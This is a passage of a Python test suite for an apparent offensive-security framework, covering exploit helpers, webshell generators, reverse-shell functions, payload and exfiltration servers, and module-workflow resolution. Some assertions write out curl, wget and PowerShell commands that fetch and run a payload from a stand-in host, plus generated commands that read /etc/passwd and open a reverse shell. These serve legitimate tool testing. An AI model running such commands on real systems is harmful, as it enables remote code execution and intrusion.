"""Comprehensive tests for OFX API modules.

Covers the ``ofx.api`` function suites plus the module-system integration that
exposes those functions as workflow steps (``local.api.<path>.<func>`` refs and
remote manifest ``api:`` entries).
"""

from __future__ import annotations

import base64
import inspect
import json
import py_compile
import re
import subprocess
import sys
import types as types_mod
import zipfile
from io import BytesIO
from pathlib import Path

import pytest

from ofx.cloud.script_runtime import (
    build_module_step_payload,
    build_udf_step_source,
    is_udf_module_step,
)
from ofx.cloud.sessions.python_steps import iter_python_step_bundles
from ofx.cloud.sessions.script_builder import build_session_script
from ofx.models.step import Step
from ofx.modules import ModuleInvocation, ModuleRegistry, ModuleRunner
from ofx.modules.refs import parse_module_ref
from ofx.runner import RunContext, RunnerStatus
from ofx.runner.registry_keys import RunnerRegistryKeys

_SENTINEL = "__OFX_MODULE_OUTPUTS__"


def _decode_sentinel(stdout: str) -> dict:
    """Decode the last ``__OFX_MODULE_OUTPUTS__`` line of a wrapper's stdout."""
    lines = [line for line in stdout.splitlines() if line.startswith(_SENTINEL)]
    assert lines, f"no module outputs sentinel in stdout: {stdout!r}"
    return json.loads(base64.b64decode(lines[-1][len(_SENTINEL) :]).decode())


class TestExploitModule:
    """Test exploit.py utilities."""

    def test_attrib_dict(self):
        from ofx.api.exploitation.exploit.utils import AttribDict

        d = AttribDict({"name": "test", "value": 123})
        assert d.name == "test"
        assert d.value == 123
        d.new_key = "new_value"
        assert d["new_key"] == "new_value"

    def test_ordered_dict(self):
        d = {}
        d["z"] = 1
        d["a"] = 2
        d["m"] = 3
        keys = list(d.keys())
        assert keys == ["z", "a", "m"]

    def test_ordered_set(self):
        from ofx.api.exploitation.exploit.utils import OrderedSet

        s = OrderedSet([3, 1, 4, 1, 5, 9, 2, 6, 5])
        assert list(s) == [3, 1, 4, 5, 9, 2, 6]

    def test_urlparse(self):
        from ofx.api.exploitation.exploit.utils import urlparse

        result = urlparse("http://example.com:8080/path")
        assert result.scheme == "http"
        assert result.hostname == "example.com"
        assert result.port == 8080
        assert result.path == "/path"

    def test_check_port(self):
        from ofx.api.exploitation.exploit.utils import check_port

        result = check_port("192.0.2.1", 99999, timeout=0.1)
        assert result is False

    def test_get_host_ip(self):
        from ofx.api.exploitation.exploit.utils import get_host_ip

        ip = get_host_ip()
        assert isinstance(ip, str)
        assert len(ip.split(".")) == 4

    def test_random_str(self):
        from ofx.api.exploitation.exploit.utils import random_str

        s1 = random_str(10)
        s2 = random_str(10)
        assert len(s1) == 10
        assert len(s2) == 10
        assert s1 != s2

    def test_get_middle_text(self):
        from ofx.api.exploitation.exploit.utils import get_middle_text

        text = "Hello [WORLD] from [EARTH]"
        result = get_middle_text(text, "[", "]")
        assert result == "WORLD"

    def test_mosaic(self):
        from ofx.api.exploitation.exploit.utils import mosaic

        text = "sensitive data 12345"
        result = mosaic(text, ratio=0.5)
        assert len(result) == len(text)
        assert "*" in result

    def test_encoder_bash_payload(self):
        from ofx.api.exploitation.exploit.utils import encoder_bash_payload

        payload = 'echo "hello"'
        encoded = encoder_bash_payload(payload)
        assert "echo" in encoded
        assert "base64" in encoded or "bash" in encoded

    def test_encoder_powershell_payload(self):
        from ofx.api.exploitation.exploit.utils import encoder_powershell_payload

        payload = 'Write-Host "hello"'
        encoded = encoder_powershell_payload(payload)
        assert "powershell" in encoded.lower() or "encodedcommand" in encoded.lower()

class TestFileModule:
    """Test file.py utilities."""

    def test_write_and_read_file(self, tmp_path):
        from ofx.api.file import read_file, write_file

        test_file = tmp_path / "subdir" / "test.txt"
        content = "Hello, World!"

        write_file(content, test_file)
        assert test_file.exists()

        read_content = read_file(test_file)
        assert read_content == content

class TestHttpModule:
    """Test http.py utilities."""

    def test_requests_alias(self):
        import httpx

        from ofx.api.http import requests

        assert requests is httpx

    def test_fetch_function_exists(self):
        from ofx.api.http import fetch

        assert callable(fetch)

    def test_post_function_exists(self):
        from ofx.api.http import post

        assert callable(post)

class TestStringsModule:
    """Test strings.py utilities."""

    def test_remove_duplicate_string(self):
        from ofx.api.strings import remove_duplicate_string

        strings = ["a", "b", "a", "c", "b", "d"]
        result = remove_duplicate_string(strings)
        assert result == ["a", "b", "c", "d"]

        assert remove_duplicate_string([]) == []

class TestUtilsModule:
    """Test utils.py utilities."""

    def test_str_to_dict(self):
        from ofx.api.utils import str_to_dict

        result = str_to_dict("{'name': 'test', 'value': 123}")
        assert result == {"name": "test", "value": 123}

        result = str_to_dict("invalid")
        assert result == {}

    def test_generate_random_user_agent(self):
        from ofx.api.utils import generate_random_user_agent

        ua1 = generate_random_user_agent()
        assert isinstance(ua1, str)
        assert len(ua1) > 0
        assert any(
            browser in ua1.lower()
            for browser in ["mozilla", "chrome", "safari", "firefox", "edge", "opera"]
        )

    def test_minimum_version_required(self):
        from ofx.api.utils import minimum_version_required

        assert minimum_version_required("1.2.0", "1.3.0") is True
        assert minimum_version_required("2.0.0", "1.9.9") is False
        assert minimum_version_required("1.2.3", "1.2.3") is True

class TestNetworkModule:
    """Test network.py utilities."""

    def test_generate_shellcode_list(self):
        from ofx.api.network import generate_shellcode_list

        result = generate_shellcode_list("x86", "linux")
        assert isinstance(result, list)
        assert len(result) > 0

    def test_bind_shell_function_exists(self):
        from ofx.api.network import bind_shell

        assert callable(bind_shell)

    def test_bind_tcp_shell_function_exists(self):
        from ofx.api.network import bind_tcp_shell

        assert callable(bind_tcp_shell)

    def test_bind_telnet_shell_function_exists(self):
        from ofx.api.network import bind_telnet_shell

        assert callable(bind_telnet_shell)

    def test_reverse_shell_function_exists(self):
        from ofx.api.network import reverse_shell

        assert callable(reverse_shell) and not inspect.iscoroutinefunction(
            reverse_shell
        )

class TestHttpServerModule:
    """Test httpserver.py utilities."""

    def test_phttp_server_import(self):
        from ofx.api.httpserver import PHTTPServer

        assert PHTTPServer is not None

    def test_phttp_server_init(self):
        from ofx.api.httpserver import PHTTPServer

        server = PHTTPServer(bind_ip="0.0.0.0", bind_port=9003)
        assert hasattr(server, "bind_ip")
        assert hasattr(server, "bind_port")
        assert server.https is False

    def test_simple_http_server_import(self):
        from ofx.api.httpserver import SimpleHTTPServer

        assert SimpleHTTPServer is not None

    def test_simple_http_server_init(self):
        from ofx.api.httpserver import SimpleHTTPServer

        server = SimpleHTTPServer(port=8000, directory="/tmp", allow_upload=True)
        assert server.port == 8000
        assert str(server.directory) == "/tmp"
        assert server.allow_upload is True
        assert server.host == "0.0.0.0"

    def test_payload_server_import(self):
        from ofx.api.httpserver import PayloadServer

        assert PayloadServer is not None

    def test_payload_server_init(self):
        from ofx.api.httpserver import PayloadServer

        server = PayloadServer(port=8080, host="127.0.0.1")
        assert server.port == 8080
        assert server.host == "127.0.0.1"
        assert server.payloads == {}
        assert server.hits == {}

    def test_payload_server_add_remove_payload(self):
        from ofx.api.httpserver import PayloadServer

        server = PayloadServer()
        server.add_payload("/test.txt", content="Hello World")
        assert "/test.txt" in server.payloads
        assert server.get_hits("/test.txt") == 0

        server.remove_payload("/test.txt")
        assert "/test.txt" not in server.payloads

    def test_exfil_server_import(self):
        from ofx.api.httpserver import ExfilServer

        assert ExfilServer is not None

    def test_exfil_server_init(self):
        from ofx.api.httpserver import ExfilServer

        server = ExfilServer(port=9000, save_dir="/tmp/exfil", auto_timestamp=False)
        assert server.port == 9000
        assert str(server.save_dir) == "/tmp/exfil"
        assert server.auto_timestamp is False
        assert server.host == "0.0.0.0"

    def test_start_server_function(self):
        from ofx.api.httpserver import start_server

        assert callable(start_server)

    def test_create_oneliner_function(self):
        from ofx.api.httpserver import create_oneliner

        cmd = create_oneliner("http://example.com/payload.sh", "curl")
        assert "curl -s http://example.com/payload.sh | bash" == cmd

        cmd = create_oneliner("http://example.com/payload.sh", "wget")
        assert "wget -q -O - http://example.com/payload.sh | bash" == cmd

        cmd = create_oneliner("http://example.com/payload.sh", "powershell")
        assert (
            "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.sh')\""
            == cmd
        )

        try:
            create_oneliner("http://example.com/payload.sh", "invalid")
            assert False, "Should raise ValueError"
        except ValueError:
            pass

class TestOOBModule:
    """Test oob submodule."""

    def test_ceye_import(self):
        from ofx.api.oob import CEye

        assert CEye is not None

    def test_interactsh_import(self):
        from ofx.api.oob import Interactsh

        assert Interactsh is not None

class TestSearchModule:
    """Test search submodule."""

    def test_fofa_import(self):
        from ofx.api.search import Fofa

        assert Fofa is not None

    def test_shodan_import(self):
        from ofx.api.search import Shodan

        assert Shodan is not None

    def test_zoomeye_import(self):
        from ofx.api.search import ZoomEye

        assert ZoomEye is not None

class TestShellcodeModule:
    """Test shellcode submodule."""

    def test_osshellcode_import(self):
        from ofx.api.exploitation.shellcode import OSShellcodes

        assert OSShellcodes is not None

    def test_shellcode_base_import(self):
        from ofx.api.exploitation.shellcode import ShellCode

        assert ShellCode is not None

    def test_shellcode_to_exe_import(self):
        from ofx.api.exploitation.shellcode import ShellcodeToExe

        assert ShellcodeToExe is not None

    def test_shell_generator_import(self):
        from ofx.api.exploitation.shellcode import ShellGenerator

        assert ShellGenerator is not None

class TestWebshellModule:
    """Test webshell submodule."""

    def test_webshell_imports(self):
        from ofx.api.exploitation.webshell import (
            WebShell,
            WebShellClient,
            WebShellCodeFactory,
            generate_webshell,
        )
        from ofx.api.exploitation.webshell.shell.asp import AspShell
        from ofx.api.exploitation.webshell.shell.aspx import AspxShell
        from ofx.api.exploitation.webshell.shell.jsp import JspShell
        from ofx.api.exploitation.webshell.shell.php import PhpShell

        assert WebShell is not None
        assert PhpShell is not None
        assert JspShell is not None
        assert AspShell is not None
        assert AspxShell is not None
        assert WebShellCodeFactory is not None
        assert WebShellClient is not None
        assert callable(generate_webshell)

    def test_php_shell_generation(self):
        from ofx.api.exploitation.webshell.shell.php import PhpShell

        shell = PhpShell(password="test123")
        code = shell.get_webshell()
        assert "<?php" in code
        assert "test123" in code or "{{PASSWORD}}" not in code

    def test_webshell_factory_operations(self):
        from ofx.api.exploitation.webshell import WebShellCodeFactory

        code = WebShellCodeFactory.run_command("python", "whoami")
        assert "d2hvYW1p" in code or "subprocess" in code

        code = WebShellCodeFactory.read_file("python", "/etc/passwd")
        assert "L2V0Yy9wYXNzd2Q" in code or "open" in code

        code = WebShellCodeFactory.reverse_shell("bash", "192.168.1.1", 4444)
        assert "base64" in code or "/dev/tcp/" in code

    def test_generate_webshell_convenience(self):
        from ofx.api.exploitation.webshell import generate_webshell

        code = generate_webshell("php", password="secret")
        assert "<?php" in code
        assert "secret" in code or "{{PASSWORD}}" not in code

# ---------------------------------------------------------------------------
# ofx.api functions as workflow modules (local.api.* refs, manifest api: entries)
# ---------------------------------------------------------------------------


class TestResolveApiCallable:
    """Longest-prefix resolution of ofx.api dotted paths."""

    def test_nested_module_function(self):
        from ofx.modules.api import resolve_api_callable

        func = resolve_api_callable("recon.targets.split_targets")
        from ofx.api.recon.targets import split_targets

        assert func is split_targets

    def test_subpackage_reexport_shorthand(self):
        """A path whose tail is re-exported by a package __init__ resolves."""
        from ofx.modules.api import resolve_api_callable

        func = resolve_api_callable("recon.crtsh_subdomains_sync")
        assert callable(func)

    def test_full_module_without_attribute_is_resolved_as_import(self):
        from ofx.api.recon.targets import classify_target
        from ofx.modules.api import resolve_api_callable

        func = resolve_api_callable("recon.targets.classify_target")
        assert func is classify_target

    def test_unknown_path_error_lists_attempts(self):
        from ofx.modules.api import ApiModuleError, resolve_api_callable

        with pytest.raises(ApiModuleError) as excinfo:
            resolve_api_callable("recon.nope.missing_func")
        message = str(excinfo.value)
        assert "missing_func" in message
        assert "Tried:" in message
        assert "ofx.api.recon.nope.missing_func" in message
        assert "ofx.api.recon" in message

    def test_unknown_top_level_module_error(self):
        from ofx.modules.api import ApiModuleError, resolve_api_callable

        with pytest.raises(ApiModuleError, match="Tried:"):
            resolve_api_callable("definitely_not_a_module.func")

    def test_non_callable_target_rejected(self):
        from ofx.modules.api import ApiModuleError, resolve_api_callable

        with pytest.raises(ApiModuleError):
            resolve_api_callable("recon.targets.TARGET_TYPES")

    def test_empty_path_rejected(self):
        from ofx.modules.api import ApiModuleError, resolve_api_callable

        for path in ("", "   ", ".", "a..b"):
            with pytest.raises(ApiModuleError):
                resolve_api_callable(path)


class TestInvokeApiCallableFiltering:
    """Args are filtered to the signature; extras are ignored."""

    def test_extra_args_ignored(self):
        from ofx.modules.api import invoke_api_callable

        def func(values):
            return {"values": values}

        assert invoke_api_callable(
            func, {"values": ["a"], "junk_extra": "ignored", "target": "x"}
        ) == {"values": ["a"]}

    def test_missing_required_param_names_param_and_received_keys(self):
        from ofx.modules.api import ApiModuleError, invoke_api_callable

        def func(values, timeout):
            return None

        with pytest.raises(ApiModuleError) as excinfo:
            invoke_api_callable(func, {"junk": 1})
        message = str(excinfo.value)
        assert "values" in message and "timeout" in message
        assert "junk" in message
        assert "Received keys" in message
        assert "func" in message

    def test_missing_param_error_lists_received_keys_sorted(self):
        from ofx.modules.api import ApiModuleError, invoke_api_callable

        def func(required):
            return None

        with pytest.raises(ApiModuleError) as excinfo:
            invoke_api_callable(func, {"b": 1, "a": 2})
        assert "a, b" in str(excinfo.value)

    def test_missing_param_error_when_no_keys(self):
        from ofx.modules.api import ApiModuleError, invoke_api_callable

        def func(required):
            return None

        with pytest.raises(ApiModuleError, match=r"\(none\)"):
            invoke_api_callable(func, {})

    def test_defaults_are_optional(self):
        from ofx.modules.api import invoke_api_callable

        def func(values, sep=","):
            return (values, sep)

        assert invoke_api_callable(func, {"values": "a"}) == ("a", ",")
        assert invoke_api_callable(func, {"values": "a", "sep": ";"}) == ("a", ";")

    def test_var_keyword_receives_everything(self):
        from ofx.modules.api import invoke_api_callable

        def func(**kwargs):
            return kwargs

        assert invoke_api_callable(func, {"a": 1, "b": 2}) == {"a": 1, "b": 2}

    def test_var_positional_is_not_passed(self):
        from ofx.modules.api import invoke_api_callable

        def func(name, *args):
            return (name, args)

        assert invoke_api_callable(func, {"name": "n", "args": ["ignored"]}) == ("n", ())


class TestIsCtxStyle:
    """ctx-style detection drives ModuleContext vs kwargs invocation."""

    def test_unannotated_ctx_is_ctx_style(self):
        from ofx.modules.api import is_ctx_style

        def func(ctx):
            return None

        assert is_ctx_style(func) is True

    def test_module_context_annotation_is_ctx_style(self):
        from ofx.modules.api import is_ctx_style
        from ofx.modules.base import ModuleContext

        def func(ctx: ModuleContext):
            return None

        assert is_ctx_style(func) is True

    def test_forward_ref_annotation_is_ctx_style(self):
        """Both a bare and a quoted forward reference to ModuleContext count."""
        from ofx.modules.api import is_ctx_style

        def func(ctx):
            return None

        # as under ``from __future__ import annotations`` with ``ctx:
        # "ModuleContext"`` the stored value keeps the source quotes.
        for annotation in ("ModuleContext", "ofx.modules.base.ModuleContext", '"ModuleContext"'):
            func.__annotations__["ctx"] = annotation
            assert is_ctx_style(func) is True

    def test_other_annotation_is_not_ctx_style(self):
        from ofx.modules.api import is_ctx_style

        def func(ctx: dict):
            return None

        assert is_ctx_style(func) is False

    def test_kwargs_function_is_not_ctx_style(self):
        from ofx.modules.api import is_ctx_style

        def func(values):
            return None

        assert is_ctx_style(func) is False

    def test_builtin_without_signature_is_not_ctx_style(self):
        from ofx.modules.api import is_ctx_style

        assert is_ctx_style(len) is False


class TestApiModuleRefs:
    """``local.api.*`` spec parsing (checked before local_named)."""

    def test_api_ref_parses_path_and_function(self):
        from ofx.modules.refs import API_KIND, parse_module_ref

        ref = parse_module_ref("local.api.recon.targets.split_targets")
        assert ref.kind == API_KIND
        assert ref.api_path == "recon.targets.split_targets"
        assert ref.function == "split_targets"
        assert ref.name is None

    def test_api_shorthand_single_segment(self):
        from ofx.modules.refs import API_KIND, parse_module_ref

        ref = parse_module_ref("local.api.opsec")
        assert ref.kind == API_KIND
        assert ref.api_path == "opsec"

    def test_api_refs_are_not_local_named(self):
        from ofx.modules.refs import API_KIND

        assert parse_module_ref("local.api.recon.targets.split_targets").kind != "local_named"
        assert parse_module_ref("local.scan").kind != API_KIND

    def test_at_ref_rejected(self):
        with pytest.raises(ValueError, match="'@<ref>' is not valid on 'local.api"):
            parse_module_ref("local.api.recon.targets.split_targets@v1")

    def test_function_suffix_rejected(self):
        with pytest.raises(ValueError, match="do not take a '::<func>' suffix"):
            parse_module_ref("local.api.recon.targets.split_targets::run")

    def test_missing_path_rejected(self):
        for spec in ("local.api", "local.api.", "local.api..x"):
            with pytest.raises(ValueError, match="local.api"):
                parse_module_ref(spec)


class TestRegistryApiResolution:
    """Registry resolves api refs to kind='api' specs."""

    def test_local_api_longest_prefix(self):
        spec = ModuleRegistry().resolve("local.api.recon.targets.split_targets")
        assert spec.kind == "api"
        assert spec.function == "split_targets"
        assert spec.callable is not None
        from ofx.api.recon.targets import split_targets

        assert spec.callable is split_targets

    def test_local_api_shorthand_reexport(self):
        spec = ModuleRegistry().resolve("local.api.recon.crtsh_subdomains_sync")
        assert spec.kind == "api"
        assert spec.callable is not None

    def test_unknown_api_path_raises_with_attempts(self):
        with pytest.raises(ValueError, match="Tried:"):
            ModuleRegistry().resolve("local.api.recon.nope_not_here")


class TestModuleRunnerApi:
    """api specs execute through the runner as kwargs-style steps."""

    @pytest.mark.asyncio
    async def test_dict_return_merged_and_extra_args_filtered(self):
        invocation = ModuleInvocation(
            name="local.api.recon.targets.split_targets",
            args={"values": ["1.2.3.4", "example.com"], "junk_extra": "ignored"},
        )
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.COMPLETED
        assert result.error is None
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["ip"] == ["1.2.3.4"]
        assert outputs["domain"] == ["example.com"]
        assert outputs["exit_code"] == 0
        assert "junk_extra" not in outputs

    @pytest.mark.asyncio
    async def test_str_return_lands_in_result_output(self):
        invocation = ModuleInvocation(
            name="local.api.utils.str_to_dict",
            args={"value": "{'a': 1}", "noise": "ignored"},
        )
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.COMPLETED
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["a"] == 1
        assert outputs["exit_code"] == 0

    @pytest.mark.asyncio
    async def test_non_dict_return_lands_in_result_output(self):
        invocation = ModuleInvocation(
            name="local.api.utils.minimum_version_required",
            args={"version": "1.2.0", "current_version": "1.3.0"},
        )
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.COMPLETED
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["result"] is True
        assert outputs["exit_code"] == 0

    @pytest.mark.asyncio
    async def test_missing_required_param_fails_and_names_param(self):
        invocation = ModuleInvocation(
            name="local.api.recon.targets.split_targets",
            args={"junk_extra": "only-this"},
        )
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.FAILED
        assert result.error is not None
        assert "values" in result.error
        assert "junk_extra" in result.error
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["exit_code"] == 1
        assert "ApiModuleError" in outputs["stderr"]

    @pytest.mark.asyncio
    async def test_raising_api_function_fails_with_traceback(self):
        invocation = ModuleInvocation(
            name="local.api.recon.targets.classify_target",
            args={"value": "not-a-target"},
        )
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.FAILED
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["exit_code"] == 1
        assert "Traceback" in outputs["stderr"]

    @pytest.mark.asyncio
    async def test_ctx_style_api_function_receives_module_context(self):
        """ctx-style detection routes the call to ModuleContext, not kwargs."""
        from ofx.modules.api import ApiModuleError, invoke_api_callable, is_ctx_style
        from ofx.modules.base import ModuleSpec

        def probe(ctx):
            return {"seen": ctx.inputs.get("timeout")}

        assert is_ctx_style(probe) is True
        # invoke_api_callable is kwargs-only by contract: a ctx-style function
        # has no kwargs signature to satisfy, so it reports the missing param.
        with pytest.raises(ApiModuleError, match="ctx"):
            invoke_api_callable(probe, {"timeout": 5})

        spec = ModuleSpec(kind="api", name="local.api.fake.probe", callable=probe)
        module_result = ModuleRunner(
            ModuleInvocation(name="local.api.fake.probe", args={"timeout": 5}),
            RunContext(),
        )._invoke_udf(spec)
        assert module_result.exit_code == 0
        assert module_result.outputs["seen"] == 5

    @pytest.mark.asyncio
    async def test_ctx_style_api_function_runs_through_runner(self, tmp_path, monkeypatch):
        """A ctx-style api function is called with the ModuleContext, not kwargs."""
        from ofx.modules import registry as registry_module
        from ofx.modules.base import ModuleSpec

        seen: dict[str, object] = {}

        def probe(ctx):
            seen["ctx"] = ctx
            ctx.add_outputs(from_ctx=True)
            return {"returned": True}

        def fake_resolve(self, spec, *, workflow_dir=None):
            return ModuleSpec(kind="api", name=spec, callable=probe)

        monkeypatch.setattr(registry_module.ModuleRegistry, "resolve", fake_resolve)
        invocation = ModuleInvocation(name="local.api.fake.probe", args={"junk": 1})
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.COMPLETED
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["from_ctx"] is True
        assert outputs["returned"] is True
        from ofx.modules.base import ModuleContext

        assert isinstance(seen["ctx"], ModuleContext)
        assert seen["ctx"].inputs == {"junk": 1}


_MANIFEST_WITH_API = """\
name: ofx-modules
version: 1.0.0
modules:
  classify:
    description: Classify targets into typed lists
    api: recon.targets.split_targets
  split_values:
    api: strings.remove_duplicate_string
"""


class _FakeGitRepo:
    def __init__(self, checkout_calls=None):
        self.git = types_mod.SimpleNamespace(
            checkout=lambda ref: checkout_calls.append(ref) if checkout_calls is not None else None
        )

    def close(self):
        pass


def _install_fake_clone(monkeypatch, manifest: str) -> list[tuple[str, str]]:
    """Patch the git layer so an api-only manifest repo needs no network."""
    clone_calls: list[tuple[str, str]] = []
    monkeypatch.setattr("ofx.modules.remote.get_github_token", lambda: "")

    def fake_clone_from(url, target, multi_options=None):
        clone_calls.append((url, target))
        target_path = Path(target)
        target_path.mkdir(parents=True, exist_ok=True)
        (target_path / "ofx-modules.yml").write_text(manifest)
        return _FakeGitRepo()

    monkeypatch.setattr(
        "ofx.modules.remote.git",
        types_mod.SimpleNamespace(
            Repo=types_mod.SimpleNamespace(clone_from=fake_clone_from)
        ),
    )
    return clone_calls


class TestRemoteApiManifestEntries:
    """Manifest ``api:`` entries resolve and run without any .py files."""

    def test_entry_has_api_path_and_no_file(self, monkeypatch, tmp_path):
        from ofx.modules.remote import ensure_remote_module

        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(monkeypatch, _MANIFEST_WITH_API)
        entry = ensure_remote_module(parse_module_ref("acme.ofx-api.classify"))
        assert entry.api_path == "recon.targets.split_targets"
        assert entry.file is None
        assert entry.function == "split_targets"

    def test_registry_resolves_api_entry_to_api_spec(self, monkeypatch, tmp_path):
        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(monkeypatch, _MANIFEST_WITH_API)
        spec = ModuleRegistry().resolve("acme.ofx-api.classify")
        assert spec.kind == "api"
        assert spec.name == "acme.ofx-api.classify"
        from ofx.api.recon.targets import split_targets

        assert spec.callable is split_targets

    @pytest.mark.asyncio
    async def test_remote_api_entry_runs_end_to_end(self, monkeypatch, tmp_path):
        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(monkeypatch, _MANIFEST_WITH_API)
        invocation = ModuleInvocation(
            name="acme.ofx-api.split_values",
            args={"strings": ["a", "b", "a"], "noise": "ignored"},
        )
        runner = ModuleRunner(invocation, RunContext())
        result = await runner.run()
        assert result.status == RunnerStatus.COMPLETED
        outputs = await runner.reg_get(RunnerRegistryKeys.OUTPUTS)
        assert outputs["result"] == ["a", "b"]

    def test_invalid_api_path_fails_fast(self, monkeypatch, tmp_path):
        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(
            monkeypatch,
            "name: ofx-modules\nmodules:\n  broken:\n    api: recon.not_there.nope\n",
        )
        with pytest.raises(ValueError, match="Tried:"):
            ModuleRegistry().resolve("acme.ofx-api.broken")

    def test_empty_api_value_rejected(self, monkeypatch, tmp_path):
        from ofx.modules.remote import ManifestError

        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(
            monkeypatch, "name: ofx-modules\nmodules:\n  broken:\n    api: '   '\n"
        )
        with pytest.raises(ManifestError, match="non-empty dotted path"):
            ModuleRegistry().resolve("acme.ofx-api.broken")

    def test_function_suffix_on_api_entry_rejected(self, monkeypatch, tmp_path):
        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(monkeypatch, _MANIFEST_WITH_API)
        with pytest.raises(ValueError, match="'::<func>' is not valid"):
            ModuleRegistry().resolve("acme.ofx-api.classify::other")

    def test_api_plus_function_key_rejected(self, monkeypatch, tmp_path):
        from ofx.modules.remote import ManifestError

        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(
            monkeypatch,
            "name: ofx-modules\nmodules:\n  broken:\n"
            "    api: recon.targets.split_targets\n    function: other\n",
        )
        with pytest.raises(ManifestError, match="'api' entry takes its function"):
            ModuleRegistry().resolve("acme.ofx-api.broken")

    def test_ensure_remote_module_file_rejects_api_entry(self, monkeypatch, tmp_path):
        from ofx.modules.remote import ensure_remote_module_file

        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(monkeypatch, _MANIFEST_WITH_API)
        with pytest.raises(ValueError, match="no entry file"):
            ensure_remote_module_file(parse_module_ref("acme.ofx-api.classify"))

    def test_udf_entries_still_work_alongside_api_entries(self, monkeypatch, tmp_path):
        manifest = _MANIFEST_WITH_API + "".join(
            [
                "  parse_nmap:\n",
                "    entry: modules/parse_nmap.py\n",
            ]
        )
        modules_root = tmp_path / "mods"
        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", modules_root)
        _install_fake_clone(monkeypatch, manifest)

        # Seed the UDF file after the (faked) clone by resolving twice: the
        # first resolve fails on the missing entry file, the second reuses the
        # cache once the file is written (no re-clone).
        with pytest.raises(ValueError, match="entry file not found"):
            ModuleRegistry().resolve("acme.ofx-api.parse_nmap")
        repo = modules_root / "acme" / "ofx-api"
        (repo / "modules").mkdir(parents=True, exist_ok=True)
        (repo / "modules" / "parse_nmap.py").write_text(
            "def run(ctx):\n    return {'ok': 1}\n"
        )
        spec = ModuleRegistry().resolve("acme.ofx-api.parse_nmap")
        assert spec.kind == "udf"
        assert spec.callable is not None
        # Both kinds coexist in one manifest.
        assert ModuleRegistry().resolve("acme.ofx-api.classify").kind == "api"


class TestApiRemoteWrapper:
    """The streaming wrapper for api steps imports the function by path."""

    def _api_step(self, module: str = "local.api.recon.targets.split_targets") -> Step:
        return Step(module=module, run_with={})

    def test_is_udf_module_step_covers_api_refs(self):
        assert is_udf_module_step(self._api_step()) is True

    def test_wrapper_imports_function_and_compiles(self, tmp_path):
        wrapper = build_udf_step_source(
            self._api_step(),
            workflow_dir=tmp_path,
            inputs={"values": ["1.2.3.4", "example.com"]},
            secrets={"token": "s3cr3t"},
        )
        assert "from ofx.api.recon.targets import split_targets as _func" in wrapper
        assert "_invoke_kwargs" in wrapper
        assert "_UDF_CTX_STYLE = False" in wrapper
        assert '"values": ["1.2.3.4", "example.com"]' in wrapper
        assert '"token": "s3cr3t"' in wrapper

        generated = tmp_path / "api_wrapper.py"
        generated.write_text(wrapper)
        py_compile.compile(str(generated), doraise=True)

    def test_wrapper_shorthand_path_imports_package_level_name(self, tmp_path):
        wrapper = build_udf_step_source(
            Step(module="local.api.recon.crtsh_subdomains_sync", run_with={}),
            workflow_dir=tmp_path,
            inputs={},
            secrets={},
        )
        assert "from ofx.api.recon import crtsh_subdomains_sync as _func" in wrapper

    def test_wrapper_runs_via_subprocess_and_emits_sentinel(self, tmp_path):
        wrapper = build_udf_step_source(
            self._api_step(),
            workflow_dir=tmp_path,
            inputs={"values": ["1.2.3.4", "example.com"], "unused": "ignored"},
            secrets={},
        )
        proc = subprocess.run(
            [sys.executable, "-c", wrapper],
            capture_output=True,
            text=True,
            cwd=str(tmp_path),
        )
        assert proc.returncode == 0, proc.stderr
        outputs = _decode_sentinel(proc.stdout)
        assert outputs["ip"] == ["1.2.3.4"]
        assert outputs["domain"] == ["example.com"]
        assert "unused" not in outputs

    def test_wrapper_reports_missing_required_argument(self, tmp_path):
        wrapper = build_udf_step_source(
            self._api_step(),
            workflow_dir=tmp_path,
            inputs={"junk_extra": "only-this"},
            secrets={},
        )
        proc = subprocess.run(
            [sys.executable, "-c", wrapper],
            capture_output=True,
            text=True,
            cwd=str(tmp_path),
        )
        assert proc.returncode == 1
        assert "values" in proc.stderr
        assert "junk_extra" in proc.stderr
        assert _decode_sentinel(proc.stdout) == {}

    def test_wrapper_serializes_non_dict_return_as_result(self, tmp_path):
        wrapper = build_udf_step_source(
            Step(
                module="local.api.utils.minimum_version_required",
                run_with={},
            ),
            workflow_dir=tmp_path,
            inputs={"version": "1.2.0", "current_version": "1.3.0"},
            secrets={},
        )
        proc = subprocess.run(
            [sys.executable, "-c", wrapper],
            capture_output=True,
            text=True,
            cwd=str(tmp_path),
        )
        assert proc.returncode == 0, proc.stderr
        assert _decode_sentinel(proc.stdout) == {"result": True}

    def test_remote_api_entry_builds_api_wrapper(self, monkeypatch, tmp_path):
        monkeypatch.setattr("ofx.modules.remote.MODULES_DIR", tmp_path / "mods")
        _install_fake_clone(monkeypatch, _MANIFEST_WITH_API)
        wrapper = build_udf_step_source(
